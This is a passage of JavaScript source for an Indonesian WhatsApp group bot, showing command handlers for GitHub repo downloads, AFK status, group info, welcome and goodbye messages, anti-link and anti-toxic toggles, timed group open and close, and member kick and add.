console.log(color('[ ERROR ]', 'red'), e)
m.reply(mess.error.api)
})}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'gitclone':{
let regx = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://github.com/`)
if (!regx.test(text)) return m.reply('Linknya salah')
m.reply(mess.wait)
let [, usr, repo] = text.match(regx) || []
let repos = repo.replace(/.git$/, '')
let hasdl = `https://api.github.com/repos/${usr}/${repos}/zipball`
let namafile = (await fetch(hasdl, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
juna.sendMessage(m.chat, { document: { url: hasdl }, mimetype: 'application/zip', fileName: namafile }, { quoted: m })
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break

// Group Menu
case'afk':
if (!m.isGroup) return m.reply(mess.OnlyGrup)
if (isAfkOn) return m.reply('Afk sudah diaktifkan sebelumnya')
addCountCmd('afk', m.sender, _cmd)
let reason = text ? text : 'Nothing.'
afk.addAfkUser(m.sender, Date.now(), reason, _afk)
juna.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} sedang afk\nAlasan : ${reason}`, m)
break
case 'infogc': case 'infogrup': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
let data = await juna.groupMetadata(m.chat)
var infogc = `------------ » *GRUP INFO* « ------------

*Keamanan* :
• *_Anti Link_* : ${isAntiLink ? 'Aktif 🟢' : 'Mati 🔴'}
• *_Anti Link TT_* : ${isAntiLinktt ? 'Aktif 🟢' : 'Mati 🔴'}
• *_Anti Toxic_* : ${isAntitoxic ? 'Aktif 🟢' : 'Mati 🔴'}
• *_Anti Virtex_* : ${isAntivirtex ? 'Aktif 🟢' : 'Mati 🔴'}
• *_Anti Wa Me_* : ${isAntiWame ? 'Aktif 🟢' : 'Mati 🔴'}
• *_Anti Wa Me 2_* : ${isAntiWame2 ? 'Aktif 🟢' : 'Mati 🔴'}
• *_Anti Link 2_* : ${isAntiLink2 ? 'Aktif 🟢' : 'Mati 🔴'}
• *_Auto Download_* : ${isAutodlgc ? 'Aktif 🟢' : 'Mati 🔴'}
• *_Auto Ai GC_* : ${isAutoAiGc ? 'Aktif 🟢' : 'Mati 🔴'}
• *_Kick Me_* : ${isKickMe ? 'Aktif 🟢' : 'Mati 🔴'}
• *_Welcome_* : ${isWelcome ? 'Aktif 🟢' : 'Mati 🔴'}
• *_Left_* : ${isLeft ? 'Aktif 🟢' : 'Mati 🔴'}

*Group Info* :
• *_Name_* : ${data.subject}
• *_ID_* : ${data.id}
• *_Dibuat_* : ${moment(data.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
• *_Owner Grup_* : ${data.owner !== undefined ? '@' + data.owner.split`@`[0] : 'Unknown'}
• *_Jumlah Admin_* : ${data.participants.filter(x => x.admin === 'admin').length} Ekor
• *_Jumlah Peserta_* : ${data.participants.filter(x => x.admin === null).length} Ekor


© 2024 • WhatsApp LLC`
await bales(infogc)
}
break
case'welcome':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('welcome', m.sender, _cmd)
if (isWelcome) return m.reply(`Udah on`)
_welcome.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
m.reply('Sukses mengaktifkan welcome di grup ini')
} else if (args[0] === "off") {
addCountCmd('welcome', m.sender, _cmd)
if (!isWelcome) return m.reply(`Udah off`)
let anu = _welcome.indexOf(m.chat)
_welcome.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
m.reply('Sukses menonaktifkan welcome di grup ini')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case'left': case 'goodbye':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('left', m.sender, _cmd)
if (isLeft) return m.reply(`Udah on`)
_left.push(m.chat)
fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
m.reply('Sukses mengaktifkan goodbye di grup ini')
} else if (args[0] === "off") {
addCountCmd('left', m.sender, _cmd)
if (!isLeft) return m.reply(`Udah off`)
let anu = _left.indexOf(m.chat)
_left.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
m.reply('Sukses menonaktifkan goodbye di grup ini')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case'setwelcome':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) return m.reply(`Set welcome already active`)
addSetWelcome(text, m.chat, set_welcome_db)
addCountCmd('setwelcome', m.sender, _cmd)
m.reply(`Successfully set welcome!`)
break
case'changewelcome':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) {
addCountCmd('changewelcome', m.sender, _cmd)
changeSetWelcome(q, m.chat, set_welcome_db)
m.reply(`Sukses change set welcome teks!`)
} else {
addCountCmd('changewelcome', m.sender, _cmd)
addSetWelcome(q, m.chat, set_welcome_db)
m.reply(`Sukses change set welcome teks!`)
}
break
case'delsetwelcome':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
if (!isSetWelcome(m.chat, set_welcome_db)) return m.reply(`Belum ada set welcome di sini..`)
removeSetWelcome(m.chat, set_welcome_db)
addCountCmd('delsetwelcome', m.sender, _cmd)
m.reply(`Sukses delete set welcome`)
break
case'setleft':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) return m.reply(`Set left already active`)
addCountCmd('setleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
m.reply(`Successfully set left!`)
break
case'changeleft':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) {
addCountCmd('changeleft', m.sender, _cmd)
changeSetLeft(q, m.chat, set_left_db)
m.reply(`Sukses change set left teks!`)
} else {
addCountCmd('changeleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
m.reply(`Sukses change set left teks!`)
}
break
case'delsetleft':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
if (!isSetLeft(m.chat, set_left_db)) return m.reply(`Belum ada set left di sini..`)
addCountCmd('delsetleft', m.sender, _cmd)
removeSetLeft(m.chat, set_left_db)
m.reply(`Sukses delete set left`)
break
case 'linkgrup': case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
let response = await juna.groupInviteCode(m.chat)
juna.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'pppanjang': case 'setppbot2':{
if (!isCreator) return m.reply('Fitur Khusus owner!')
if (!quoted) return m.reply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Reply foto dgn caption ${prefix + command}`)
let media = await juna.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await juna.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
m.reply("Done!!!")
}
break
case 'pppanjanggc': case 'ppgcfull': case 'setppgc2':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (!quoted) return m.reply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Reply foto dgn caption ${prefix + command}`)
let media = await juna.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await juna.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
m.reply("Done!!!")
}
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (!quoted) return m.reply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await juna.downloadAndSaveMediaMessage(quoted)
await juna.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply("Berhasil mengganti pp group")
}
break
case 'setname': case 'setsubject': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (!text) return m.reply(`Contoh ${prefix + command} WhatsApp Bot`)
await juna.groupUpdateSubject(m.chat, text).then((res) => m.reply("Done")).catch((err) => m.reply(jsonformat(err)))
}
break
case 'sc':
case 'source': {
sc = fs.readFileSync('./media/sound/sc.mp3')
juna.sendMessage(m.chat, {audio: sc, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
break
case 'setdesc': case 'setdesk': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (!text) return m.reply(`Contoh ${prefix + command} WhatsApp Bot`)
await juna.groupUpdateDescription(m.chat, text).then((res) => m.reply("Done")).catch((err) => m.reply(jsonformat(err)))
}
break
case'autoaigrup':case "aigrup": case'autoaigc':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('autoaigrup', m.sender, _cmd)
if (isAutoAiGc) return m.reply(`Udah aktif`)
openaigc.push(m.chat)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
m.reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('autoaigrup', m.sender, _cmd)
if (!isAutoAiGc) return m.reply(`Udah nonaktif`)
let anu = openaigc.indexOf(m.chat)
openaigc.splice(anu, 1)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
m.reply('Successfully Disabling Auto AI')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'autoaijapri':case "aipc": case'autoaipc':{
if (m.isGroup) return m.reply('Fitur Khusus Japri!')
if (!isCreator) return m.reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('autoaijapri', m.sender, _cmd)
if (isAutoAiPc) return m.reply(`Udah aktif`)
openaipc.push(botNumber)
fs.writeFileSync('./database/openaipc.json', JSON.stringify(openaipc, null, 2))
m.reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('autoaijapri', m.sender, _cmd)
if (!isAutoAiPc) return m.reply(`Udah nonaktif`)
let anu = openaipc.indexOf(botNumber)
openaipc.splice(anu, 1)
fs.writeFileSync('./database/openaipc.json', JSON.stringify(openaipc, null, 2))
m.reply('Successfully Disabling Auto AI')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'antilink':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('antilink', m.sender, _cmd)
if (isAntiLink) return m.reply(`Udah aktif`)
antilink.push(m.chat)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
m.reply('Successfully Activate Antilink In This Group')
} else if (args[0] === "off") {
addCountCmd('antilink', m.sender, _cmd)
if (!isAntiLink) return m.reply(`Udah nonaktif`)
let anu = antilink.indexOf(m.chat)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
m.reply('Successfully Disabling Antilink In This Group')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'antilink2':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
 if (args[0] === "on") {
addCountCmd('antilink2', m.sender, _cmd)
if (isAntiLink2) return m.reply(`Udah aktif`)
antilink2.push(m.chat)
fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
m.reply('Successfully Activate Antilink2 In This Group')
} else if (args[0] === "off") {
addCountCmd('antilink2', m.sender, _cmd)
if (!isAntiLink2) return m.reply(`Udah nonaktif`)
let anu = antilink2.indexOf(m.chat)
antilink2.splice(anu, 1)
fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
m.reply('Successfully Disabling Antilink2 In This Group')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'antivirtex':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('antivirtex', m.sender, _cmd)
if (isAntivirtex) return m.reply(`Udah aktif`)
antivirtex.push(m.chat)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex, null, 2))
m.reply('Successfully Activate Antivirtex In This Group')
} else if (args[0] === "off") {
addCountCmd('antivirtex', m.sender, _cmd)
if (!isAntivirtex) return m.reply(`Udah nonaktif`)
let anu = antivirtex.indexOf(m.chat)
antivirtex.splice(anu, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex, null, 2))
m.reply('Successfully Disabling Antivirtex In This Group')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'autodl':{
if (args[0] === "on") {
addCountCmd('autodl', m.sender, _cmd)
if (isAutodlgc) return m.reply(`Udah aktif`)
autodlgc.push(m.chat)
fs.writeFileSync('./database/autodlgc.json', JSON.stringify(autodlgc, null, 2))
m.reply('Successfully Activate Autodl In This Chat')
} else if (args[0] === "off") {
addCountCmd('autodl', m.sender, _cmd)
if (!isAutodlgc) return m.reply(`Udah nonaktif`)
let anu = autodlgc.indexOf(m.chat)
autodlgc.splice(anu, 1)
fs.writeFileSync('./database/autodlgc.json', JSON.stringify(autodlgc, null, 2))
m.reply('Successfully Disabling Autodl In This Chat')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'antilinktt':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('antilinktt', m.sender, _cmd)
if (isAntiLinktt) return m.reply(`Udah aktif`)
antilinktt.push(m.chat)
fs.writeFileSync('./database/antilinktt.json', JSON.stringify(antilinktt, null, 2))
m.reply('Successfully Activate antilinktt In This Group')
} else if (args[0] === "off") {
addCountCmd('antilinktt', m.sender, _cmd)
if (!isAntiLinktt) return m.reply(`Udah nonaktif`)
let anu = antilinktt.indexOf(m.chat)
antilinktt.splice(anu, 1)
fs.writeFileSync('./database/antilinktt.json', JSON.stringify(antilinktt, null, 2))
m.reply('Successfully Disabling antilinktt In This Group')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'antitoxic':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('antitoxic', m.sender, _cmd)
if (isAntitoxic) return m.reply(`Udah aktif`)
antitoxic.push(m.chat)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(antitoxic, null, 2))
m.reply('Successfully Activate Antitoxic In This Group')
} else if (args[0] === "off") {
addCountCmd('antitoxic', m.sender, _cmd)
if (!isAntitoxic) return m.reply(`Udah nonaktif`)
let anu = antitoxic.indexOf(m.chat)
antitoxic.splice(anu, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(antitoxic, null, 2))
m.reply('Successfully Disabling Antitoxic In This Group')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'kickme':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('kickme', m.sender, _cmd)
if (isKickMe) return m.reply(`Udah aktif`)
kickme.push(m.chat)
fs.writeFileSync('./database/kickme.json', JSON.stringify(kickme, null, 2))
m.reply('Successfully Activate Kickme In This Group')
} else if (args[0] === "off") {
addCountCmd('kickme', m.sender, _cmd)
if (!isKickMe) return m.reply(`Udah nonaktif`)
let anu = kickme.indexOf(m.chat)
kickme.splice(anu, 1)
fs.writeFileSync('./database/kickme.json', JSON.stringify(kickme, null, 2))
m.reply('Successfully Disabling Kickme In This Group')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'mute':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('mute', m.sender, _cmd)
if (isMute) return m.reply(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
m.reply('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('mute', m.sender, _cmd)
if (!isMute) return m.reply(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
m.reply('Successfully Unmute In This Group')
}else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'antidelete':{
// if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator) return m.reply('Fitur Khusus owner!')
//if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('antidelete', m.sender, _cmd)
if (setting.antiDelete) return m.reply(`Udah aktif`)
setting.antiDelete = true
m.reply('Successfully Activate antidelete In This bot')
} else if (args[0] === "off") {
addCountCmd('antidelete', m.sender, _cmd)
if (!setting.antiDelete) return m.reply(`Udah nonaktif`)
setting.antiDelete = false
m.reply('Successfully Disabling antidelete In This bot')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
}
break
case'antionce':case 'antivo': case 'antiviewonce':{
// if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator) return m.reply('Fitur Khusus owner!')
// if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('antionce', m.sender, _cmd)
if (setting.antiViewOnce) return m.reply(`Udah aktif`)
setting.antiViewOnce = true
m.reply('Successfully Activate Anti view once In This bot')
} else if (args[0] === "off") {
addCountCmd('antionce', m.sender, _cmd)
if (!setting.antiViewOnce) return m.reply(`Udah nonaktif`)
setting.antiViewOnce = false
m.reply('Successfully Disabling Anti view once In This bot')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
}
break
case'antiwame':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
 if (args[0] === "on") {
addCountCmd('antiwame', m.sender, _cmd)
if (isAntiWame) return m.reply(`Udah aktif`)
antiwame.push(m.chat)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
m.reply('Successfully Activate Antiwame In This Group')
} else if (args[0] === "off") {
addCountCmd('antiwame', m.sender, _cmd)
if (!isAntiWame) return m.reply(`Udah nonaktif`)
let anu = antiwame.indexOf(m.chat)
antiwame.splice(anu, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
m.reply('Successfully Disabling Antiwame In This Group')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'antiwame2':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
 if (args[0] === "on") {
addCountCmd('antiwame2', m.sender, _cmd)
if (isAntiWame2) return m.reply(`Udah aktif`)
antiwame2.push(m.chat)
fs.writeFileSync('./database/antiwame2.json', JSON.stringify(antiwame2, null, 2))
m.reply('Successfully Activate antiwame2 In This Group')
} else if (args[0] === "off") {
addCountCmd('antiwame2', m.sender, _cmd)
if (!isAntiWame2) return m.reply(`Udah nonaktif`)
let anu = antiwame2.indexOf(m.chat)
antiwame2.splice(anu, 1)
fs.writeFileSync('./database/antiwame2.json', JSON.stringify(antiwame2, null, 2))
m.reply('Successfully Disabling antiwame2 In This Group')
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'opentime': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Lu Siapa Kocak')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return m.reply('*Pilih:*\ndetik\nmenit\njam\n\n*Contoh*\n10 detik')
}
m.reply(`Grup Akan Dibuka Dalam ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
var nomor = m.participant
const open = `Grup Telah Di Buka Oleh Admin\nSekarang Semua Member Dapat Mengirim Pesan`
juna.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(open)
}, timer)
}
break
case'open': case'buka':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
addCountCmd('group', m.sender, _cmd)
juna.groupSettingUpdate(m.chat, 'not_announcement')
const textOpen = await getTextSetOpen(m.chat, set_open);
m.reply(textOpen || `Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
break
}
case'setopen':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator) return m.reply('Fitur Khusus owner!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *teks open*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group sudah buka`)
if (isSetOpen(m.chat, set_open)) return m.reply(`Set open sudah ada sebelumnya`)
addSetOpen(text, m.chat, set_open)
addCountCmd('setopen', m.sender, _cmd)
m.reply(`✅ Done set open!`)
}
break
case 'changeopen': case 'changesetopen':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator) return m.reply('Fitur Khusus owner!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *teks open*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group sudah buka`)
if (isSetOpen(m.chat, set_open)) {
addCountCmd('changeopen', m.sender, _cmd)
changeSetOpen(text, m.chat, set_open)
m.reply(`Sukses ubah set open teks!`)
} else {
addCountCmd('changeopen', m.sender, _cmd)
addSetOpen(text, m.chat, set_open)
m.reply(`Sukses ubah set open teks!`)
}
break
case 'delsetopen':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator) return m.reply('Fitur Khusus owner!')
if (!isSetOpen(m.chat, set_open)) return m.reply(`Belum ada set open di sini..`)
removeSetOpen(m.chat, set_open)
addCountCmd('delsetopen', m.sender, _cmd)
m.reply(`Sukses delete set open`)
break
case 'closetime': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Lu Siapa Kocak')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return m.reply('*Pilih:*\ndetik\nmenit\njam\n\n*Contoh*\n10 detik')
}
m.reply(`Group Akan Ditutup Dalam ${q} Di Mulai Dari Sekarang`)
setTimeout(() => {
var nomor = m.participant
const close = `Grup Di Tutup Oleh Admin\nSekarang Hanya Admin Yang Dapat Mengirim Pesan`
juna.groupSettingUpdate(m.chat, 'announcement')
m.reply(close)
}, timer)
}
break
case'close': case'tutup':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
addCountCmd('close', m.sender, _cmd)
juna.groupSettingUpdate(m.chat, 'announcement')
const textClose = await getTextSetClose(m.chat, set_close);
m.reply(textClose || `Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
break
case 'setclose':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator) return m.reply('Fitur Khusus owner!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *teks close*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group close dulu ya`)
if (isSetClose(m.chat, set_close)) return m.reply(`Set close sudah ada sebelumnya`)
addSetClose(text, m.chat, set_close)
addCountCmd('setclose', m.sender, _cmd)
m.reply(`✅ Done set close!`)
}
break
case'changeclose': case'changesetclose':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator) return m.reply('Fitur Khusus owner!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *teks close*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group close dulu ya`)
if (isSetClose(m.chat, set_close)) {
addCountCmd('changeclose', m.sender, _cmd)
changeSetClose(text, m.chat, set_close)
m.reply(`Sukses ubah set close teks!`)
} else {
addCountCmd('changeclose', m.sender, _cmd)
addSetClose(text, m.chat, set_close)
m.reply(`Sukses ubah set close teks!`)
}
break
case 'delsetclose':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator) return m.reply('Fitur Khusus owner!')
if (!isSetClose(m.chat, set_close)) return m.reply(`Belum ada set close di sini..`)
removeSetClose(m.chat, set_close)
addCountCmd('delsetclose', m.sender, _cmd)
m.reply(`Sukses delete set close`)
break
case 'hedsot': case 'buang': case 'kick': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await juna.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply('Sukses Kick Member Tydyak Berguna ✅')).catch((err) => m.reply('Tag/reply pesan target yang ingin di kick!'))
}
break
case 'add': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await juna.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply('Sukses Add Sepuh ✅')).catch((err) => m.reply('❌ Terjadi kesalahan, mungkin nmr nya privat'))
}
break
case 'promote': case 'pm': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
